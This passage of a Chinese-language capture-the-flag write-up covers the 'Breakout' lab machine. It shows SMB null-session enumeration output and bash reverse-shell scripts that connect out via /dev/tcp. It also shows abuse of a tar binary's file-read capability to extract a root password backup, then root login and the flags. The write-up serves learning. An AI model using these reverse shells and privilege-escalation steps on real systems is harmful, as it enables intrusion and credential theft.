+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">117</span><span><span style="color:#a5d6ff">                                                        
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">118</span><span><span style="color:#a5d6ff">[I] Found new SID:                                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">119</span><span><span style="color:#a5d6ff">S-1-22-1                                                                                   
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">120</span><span><span style="color:#a5d6ff">[I] Found new SID:                                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">121</span><span><span style="color:#a5d6ff">S-1-5-32                                                                                      
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">122</span><span><span style="color:#a5d6ff">[I] Found new SID:                                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">123</span><span><span style="color:#a5d6ff">S-1-5-32                                                                                         
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">124</span><span><span style="color:#a5d6ff">[I] Found new SID:                                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">125</span><span><span style="color:#a5d6ff">S-1-5-32                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">126</span><span><span style="color:#a5d6ff">[I] Found new SID:                                                                                                                                          
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">127</span><span><span style="color:#a5d6ff">S-1-5-32                                                                                         
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">128</span><span><span style="color:#a5d6ff">[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username &#39;&#39;, password &#39;&#39;                                                
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">129</span><span><span style="color:#a5d6ff">                                                                   
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">130</span><span><span style="color:#a5d6ff">S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)                                                                                  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">131</span><span><span style="color:#a5d6ff">S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">132</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">133</span><span><span style="color:#a5d6ff">[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;                                                                                 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">134</span><span><span style="color:#a5d6ff">                                                               
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">135</span><span><span style="color:#a5d6ff">S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                           
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">136</span><span><span style="color:#a5d6ff">S-1-5-32-545 BUILTIN\Users (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">137</span><span><span style="color:#a5d6ff">S-1-5-32-546 BUILTIN\Guests (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">138</span><span><span style="color:#a5d6ff">S-1-5-32-547 BUILTIN\Power Users (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">139</span><span><span style="color:#a5d6ff">S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">140</span><span><span style="color:#a5d6ff">S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">141</span><span><span style="color:#a5d6ff">S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">142</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">143</span><span><span style="color:#a5d6ff">[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;</span><span style="color:#f85149">&#39;</span>                                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">144</span><span>                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">145</span><span>S-1-22-1-1000 Unix User<span style="color:#79c0ff">\c</span>yber <span style="color:#ff7b72;font-weight:bold">(</span>Local User<span style="color:#ff7b72;font-weight:bold">)</span>                                                                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">146</span><span> <span style="color:#ff7b72;font-weight:bold">==============================(</span> Getting printer info <span style="color:#ff7b72">for</span> 192.168.242.94 <span style="color:#ff7b72;font-weight:bold">)==============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">147</span><span>                                                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">148</span><span>No printers returned.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">149</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">150</span><span>enum4linux complete on Thu Jan <span style="color:#a5d6ff">22</span> 03:24:39 <span style="color:#a5d6ff">2026</span></span></span></code></pre></div><ol>
+<li>本地用户：<code>S-1-22-1-1000 Unix User\cyber (Local User)</code>，<code>cyber</code></li>
+<li>允许空会话：<code>Server 192.168.242.94 allows sessions using username '', password ''</code></li>
+<li>密码策略：<code>Password Complexity: Disabled   Minimum Password Length: 5</code></li>
+</ol>
+<p>登录usermin，账户cyber，密码.2uqPEfj3D&lt;P&rsquo;a-3</p>
+<h2 id="二漏洞利用">二、漏洞利用<a class="anchor" href="#%e4%ba%8c%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8">#</a></h2>
+<h3 id="反弹shell失败">反弹shell（失败）<a class="anchor" href="#%e5%8f%8d%e5%bc%b9shell%e5%a4%b1%e8%b4%a5">#</a></h3>
+<p>kali linux中手动设置LingJing实验室网段ip<code>sudo ip addr add 192.168.242.100/24 dev eth0</code>，这样kali 和靶机处于同一网段中，但结果发现反而ping不通，因此删除<code>sudo ip addr del 192.168.242.100/24 dev eth0</code>，是由于<code>eth0</code>网卡处于VMware的NAT模式，有一个虚拟路由器，只负责转发<code>192.168.203.X</code>的流量，当把源IP改为<code>192.168.242.100</code>时，流量发出，但到达vmware虚拟网关后，发现不属于它管理的网段，直接把包丢弃，因此没有通路抵达靶机。
+因此修改vmware为桥接模式（复制物理网络连接状态能自动更新ip，但我的是主机，而不是到处移动的笔记本，因此不需要这个）。</p>
+<p>再次添加<code>192.168.242.100</code>ip到eth0中</p>
+<p>接着命令窗口中开启监听端口<code>nc -lvnp 4444</code>
+登录页面后左下角有cmd shell，接着编写反弹shell脚本，<code>vim shell.sh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/192.168.242.94/4444 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>chmod +x shell.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>./shell.sh</span></span></code></pre></div><p>失败！
+NAT模式失败：由于虚拟机是防火墙后的电脑
+桥接模式失败：手动添加了ip依旧无法ping通，添加ip后，kali会认为自己直接连接在那个网段，会尝试通过二层协议（ARP）寻找靶机，而不是通过原有的网关。</p>
+<h3 id="flag1">FLAG1<a class="anchor" href="#flag1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ cat user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>3mp!r3<span style="color:#ff7b72;font-weight:bold">{</span>You_Manage_To_Break_To_My_Secure_Access<span style="color:#ff7b72;font-weight:bold">}</span></span></span></code></pre></div><p>第一个FLAG<code>3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</code></p>
+<h3 id="flag2">FLAG2<a class="anchor" href="#flag2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ ls -l tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>-rwxr-xr-x <span style="color:#a5d6ff">1</span> root root <span style="color:#a5d6ff">531928</span> Oct <span style="color:#a5d6ff">19</span>  <span style="color:#a5d6ff">2021</span> tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ getcap tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>tar <span style="color:#79c0ff">cap_dac_read_search</span><span style="color:#ff7b72;font-weight:bold">=</span>ep</span></span></code></pre></div><p>发现文件权限很高，且可执行，getcap后，<code>=ep</code>，其中<code>e</code>代表有效，<code>p</code>代表允许，tar在运行时可以直接行使特权，tar可以打包系统任意文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ ls -la /var/backups
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>total <span style="color:#a5d6ff">28</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>drwxr-xr-x  <span style="color:#a5d6ff">2</span> root root  <span style="color:#a5d6ff">4096</span> Jun <span style="color:#a5d6ff">11</span> 10:36 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>drwxr-xr-x <span style="color:#a5d6ff">14</span> root root  <span style="color:#a5d6ff">4096</span> Oct <span style="color:#a5d6ff">19</span>  <span style="color:#a5d6ff">2021</span> ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>-rw-r--r--  <span style="color:#a5d6ff">1</span> root root <span style="color:#a5d6ff">12732</span> Oct <span style="color:#a5d6ff">19</span>  <span style="color:#a5d6ff">2021</span> apt.extended_states.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>-rw-------  <span style="color:#a5d6ff">1</span> root root    <span style="color:#a5d6ff">17</span> Oct <span style="color:#a5d6ff">20</span>  <span style="color:#a5d6ff">2021</span> .old_pass.bak</span></span></code></pre></div><p>接着根据攻略，检查/var/backups这一文件夹，发现一个隐藏文件<code>.old_pass.bak</code>，这个文件没有执行权限，但tar有权限，可以用tar压缩这个隐藏文件，再解压，这样权限就没有问题了</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ ./tar -cvf passwd.tar /var/backups/.old_pass.bak
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>./tar: Removing leading <span style="color:#a5d6ff">`</span>/<span style="color:#f85149">&#39;</span> from member names
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>/var/backups/.old_pass.bak
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>passwd.tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>user.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">9</span><span>var</span></span></code></pre></div><p>-c(create)、-v(verbose)可视化、-f(file)指定文件名（passwd.tar），将<code>.old_pass.bak</code>压缩到当前的目录</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ tar -xvf passwd.tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>var/backups/.old_pass.bak
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ cat var/backups/.old_pass.bak
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>Ts&amp;4&amp;YurgtRX<span style="color:#ff7b72;font-weight:bold">(=</span>~h</span></span></code></pre></div><p>执行压缩操作时候，<code>tar</code>会把路径信息存入包内，解压时候<code>tar</code>根据路径信息，在当前目录下还原出完整的文件夹层级。
+-x(extract)提取/解压、-v、-f(file)指定要解压的文件。
+第二个FLAG：<code>Ts&amp;4&amp;YurgtRX(=~h</code></p>
+<h3 id="提权先反弹shell">提权（先反弹shell）<a class="anchor" href="#%e6%8f%90%e6%9d%83%e5%85%88%e5%8f%8d%e5%bc%b9shell">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#ff7b72;font-weight:bold">[</span>cyber@breakout ~<span style="color:#ff7b72;font-weight:bold">]</span>$ su root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>Password: su: Authentication failure</span></span></code></pre></div><p>尝试root用户登录失败，不让输入密码，必须反弹shell，放弃实验室环境，直接安装虚拟机，靶机ip为：<code>192.168.203.130</code>
+接着在靶机命令行窗口中<code>vim shell.sh</code>，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-SHELL" data-lang="SHELL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/192.168.203.129/1234 0&gt;&amp;1&#39;</span></span></span></code></pre></div><p>接着赋予其权限<code>chmod +x ./bash.sh</code>，注意这里用的是<code>+</code>，我手打时候误用了<code>-</code>，导致删除权限，反而无法使用
+kali中开启端口监听，<code>nc -lvp 1234</code>
+<code>./shell.sh</code>启动文件，成功反弹shell</p>
+<p>接着root用户登录（用到了隐藏文件的内容当作密码）</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-SHELL" data-lang="SHELL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>cyber@breakout:~$ su root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>su root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>Password: Ts&amp;4&amp;YurgtRX<span style="color:#ff7b72;font-weight:bold">(=</span>~h
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>root</span></span></code></pre></div><h3 id="flag2-1">FLAG2<a class="anchor" href="#flag2-1">#</a></h3>
+<p>（cd ..可以返回上一级文件夹）接着<code>cd /root</code>，发现文件<code>rOOt.txt</code>，其中flag内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-SHELL" data-lang="SHELL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>3mp!r3<span style="color:#ff7b72;font-weight:bold">{</span>You_Manage_To_BreakOut_From_My_System_Congratulation<span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>Author: Icex64 &amp; Empire Cybersecurity</span></span></code></pre></div><h3 id="反思">反思<a class="anchor" href="#%e5%8f%8d%e6%80%9d">#</a></h3>
+<p>这里耗时最多的是反弹shell，LingJing实验室环境中开启靶机有缺点，反弹shell功能无法开启，暂未找到解决方法，因此接下来的实验都建议在官方网站中下载镜像，vmware中进行破解。</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <footer class="custom-footer">
+  <span class="status-dot"></span>
+  <span>2026 vnccer <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" class="license-link">CC BY 4.0</a></span>
+</footer>
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#一信息收集">一、信息收集</a>
+          <ul>
+            <li><a href="#11-端口扫描教训">1.1 端口扫描（教训）</a></li>
+            <li><a href="#12-端口扫描最佳思路">1.2 端口扫描（最佳思路）</a></li>
+            <li><a href="#13-http探测">1.3 http探测</a></li>
+            <li><a href="#14-1000020000端口">1.4 10000/20000端口</a></li>
+            <li><a href="#15-smb服务探测-139445端口">1.5 smb服务探测 139、445端口</a></li>
+          </ul>
+        </li>
+        <li><a href="#二漏洞利用">二、漏洞利用</a>
+          <ul>
+            <li><a href="#反弹shell失败">反弹shell（失败）</a></li>
+            <li><a href="#flag1">FLAG1</a></li>
+            <li><a href="#flag2">FLAG2</a></li>
+            <li><a href="#提权先反弹shell">提权（先反弹shell）</a></li>
+            <li><a href="#flag2-1">FLAG2</a></li>
+            <li><a href="#反思">反思</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
